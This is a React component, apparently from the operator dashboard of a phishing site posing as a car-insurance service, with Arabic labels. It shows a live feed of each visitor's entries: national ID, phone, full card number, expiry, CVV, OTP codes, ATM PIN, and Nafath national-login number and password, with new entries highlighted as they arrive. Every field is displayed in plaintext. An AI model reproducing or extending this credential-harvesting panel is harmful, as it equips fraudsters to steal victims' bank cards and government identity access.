import React, { useEffect, useRef, useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Activity, CreditCard, Phone, User, Hash, Key, Shield, Smartphone } from "lucide-react";
import type { StageEvent, InsuranceOrder } from "./types";
import { formatTime } from "./types";

interface FeedItem {
  id: string;
  timestamp: string;
  label: string;
  value: string;
  icon: React.ReactNode;
  color: string;
  isNew?: boolean;
}

interface Props {
  stageEvents: StageEvent[];
  linkedOrders: InsuranceOrder[];
}

const fieldMeta: Record<string, { label: string; icon: React.ReactNode; color: string }> = {
  national_id:        { label: "رقم الهوية",          icon: <CreditCard className="w-3 h-3" />,  color: "text-sky-500 bg-sky-500/10" },
  phone:              { label: "رقم الجوال",           icon: <Phone className="w-3 h-3" />,       color: "text-emerald-500 bg-emerald-500/10" },
  customer_name:      { label: "اسم العميل",           icon: <User className="w-3 h-3" />,        color: "text-violet-500 bg-violet-500/10" },
  card_number_full:   { label: "رقم البطاقة",          icon: <CreditCard className="w-3 h-3" />,  color: "text-amber-500 bg-amber-500/10" },
  card_holder_name:   { label: "اسم حامل البطاقة",     icon: <User className="w-3 h-3" />,        color: "text-amber-500 bg-amber-500/10" },
  card_expiry:        { label: "تاريخ انتهاء البطاقة", icon: <CreditCard className="w-3 h-3" />,  color: "text-amber-500 bg-amber-500/10" },
  card_cvv:           { label: "CVV",                  icon: <Key className="w-3 h-3" />,         color: "text-red-500 bg-red-500/10" },
  otp_code:           { label: "كود OTP",              icon: <Hash className="w-3 h-3" />,        color: "text-orange-500 bg-orange-500/10" },
  atm_pin:            { label: "PIN الصراف",           icon: <Key className="w-3 h-3" />,         color: "text-red-500 bg-red-500/10" },
  atm_bill_number:    { label: "رقم الفاتورة ATM",     icon: <Hash className="w-3 h-3" />,        color: "text-blue-500 bg-blue-500/10" },
  atm_biller_code:    { label: "كود المدفوع ATM",      icon: <Hash className="w-3 h-3" />,        color: "text-blue-500 bg-blue-500/10" },
  phone_otp_code:     { label: "كود توثيق الجوال",     icon: <Smartphone className="w-3 h-3" />,  color: "text-teal-500 bg-teal-500/10" },
  nafath_number:      { label: "رقم نفاذ",             icon: <Shield className="w-3 h-3" />,      color: "text-indigo-500 bg-indigo-500/10" },
  nafath_password:    { label: "كلمة مرور نفاذ",       icon: <Key className="w-3 h-3" />,         color: "text-red-500 bg-red-500/10" },
  serial_number:      { label: "رقم الهيكل",           icon: <Hash className="w-3 h-3" />,        color: "text-slate-500 bg-slate-500/10" },
  policy_number:      { label: "رقم الوثيقة",          icon: <Shield className="w-3 h-3" />,      color: "text-green-500 bg-green-500/10" },
  draft_policy_number:{ label: "رقم الوثيقة المبدئي",  icon: <Shield className="w-3 h-3" />,      color: "text-green-500 bg-green-500/10" },
};

function buildFeedItems(orders: InsuranceOrder[], events: StageEvent[]): FeedItem[] {
  const items: FeedItem[] = [];

  // From stage event payloads
  events.forEach((ev) => {
    if (!ev.payload) return;
    Object.entries(ev.payload).forEach(([key, val]) => {
      if (!val || !fieldMeta[key]) return;
      const meta = fieldMeta[key];
      items.push({
        id: `${ev.id}-${key}`,
        timestamp: ev.stage_entered_at || ev.created_at,
        label: meta.label,
        value: String(val),
        icon: meta.icon,
        color: meta.color,
        isNew: false,
      });
    });
  });

  // From orders directly
  orders.forEach((order) => {
    const orderFields: (keyof InsuranceOrder)[] = [
      "national_id", "phone", "customer_name",
      "card_number_full", "card_holder_name", "card_expiry", "card_cvv",
      "otp_code", "atm_pin", "atm_bill_number", "atm_biller_code",
      "phone_otp_code", "nafath_number", "nafath_password",
      "serial_number", "policy_number", "draft_policy_number",
    ];
    orderFields.forEach((key) => {
      const val = order[key];
      if (!val || !fieldMeta[key]) return;
      const alreadyExists = items.some(
        (i) => i.label === fieldMeta[key]!.label && i.value === String(val)
      );
      if (!alreadyExists) {
        const meta = fieldMeta[key]!;
        items.push({
          id: `order-${order.id}-${key}`,
          timestamp: order.created_at,
          label: meta.label,
          value: String(val),
          icon: meta.icon,
          color: meta.color,
          isNew: false,
        });
      }
    });
  });

  // Sort descending (newest first)
  items.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
  return items;
}

const VisitorDataFeed: React.FC<Props> = ({ stageEvents, linkedOrders }) => {
  const [items, setItems] = useState<FeedItem[]>([]);
  const prevIdsRef = useRef<Set<string>>(new Set());

  useEffect(() => {
    const newItems = buildFeedItems(linkedOrders, stageEvents);
    const prevIds = prevIdsRef.current;
    const updated = newItems.map((item) => ({
      ...item,
      isNew: !prevIds.has(item.id),
    }));
    prevIdsRef.current = new Set(newItems.map((i) => i.id));
    setItems(updated);
    const timer = setTimeout(() => {
      setItems((prev) => prev.map((i) => ({ ...i, isNew: false })));
    }, 2000);
    return () => clearTimeout(timer);
  }, [stageEvents, linkedOrders]);

  if (items.length === 0) return null;

  return (
    <div className="border border-border/60 rounded-xl overflow-hidden bg-background/50">
      {/* Header */}
      <div className="flex items-center gap-2 px-3 py-2 bg-primary/5 border-b border-border/40">
        <div className="w-5 h-5 rounded-md bg-primary/10 flex items-center justify-center">
          <Activity className="w-3 h-3 text-primary" />
        </div>
        <span className="text-xs font-semibold text-foreground">مدخلات الزائر</span>
        <span className="mr-auto text-[10px] text-muted-foreground bg-muted/50 px-1.5 py-0.5 rounded-full">
          {items.length} حقل
        </span>
      </div>

      {/* Feed list */}
      <div className="divide-y divide-border/30 max-h-64 overflow-y-auto">
        <AnimatePresence initial={false}>
          {items.map((item) => (
            <motion.div
              key={item.id}
              initial={item.isNew ? { opacity: 0, y: -8, backgroundColor: "rgba(var(--primary), 0.08)" } : false}
              animate={{ opacity: 1, y: 0, backgroundColor: "rgba(0,0,0,0)" }}
              transition={{ duration: 0.35, ease: "easeOut" }}
              className={`flex items-center gap-2.5 px-3 py-2 hover:bg-muted/20 transition-colors ${item.isNew ? "bg-primary/5" : ""}`}
            >
              {/* Icon */}
              <div className={`w-6 h-6 rounded-md flex items-center justify-center shrink-0 ${item.color}`}>
                {item.icon}
              </div>

              {/* Content */}
              <div className="flex-1 min-w-0">
                <p className="text-[10px] text-muted-foreground leading-none mb-0.5">{item.label}</p>
                <p className="text-xs font-medium text-foreground truncate font-mono">
                  {item.value}
                </p>
              </div>

              {/* Timestamp + new indicator */}
              <div className="flex items-center gap-1.5 shrink-0">
                <span className="text-[10px] text-muted-foreground/60 whitespace-nowrap">
                  {formatTime(item.timestamp)}
                </span>
                {item.isNew && (
                  <span className="w-1.5 h-1.5 rounded-full bg-primary animate-pulse shrink-0" />
                )}
              </div>
            </motion.div>
          ))}
        </AnimatePresence>
      </div>
    </div>
  );
};

export default VisitorDataFeed;
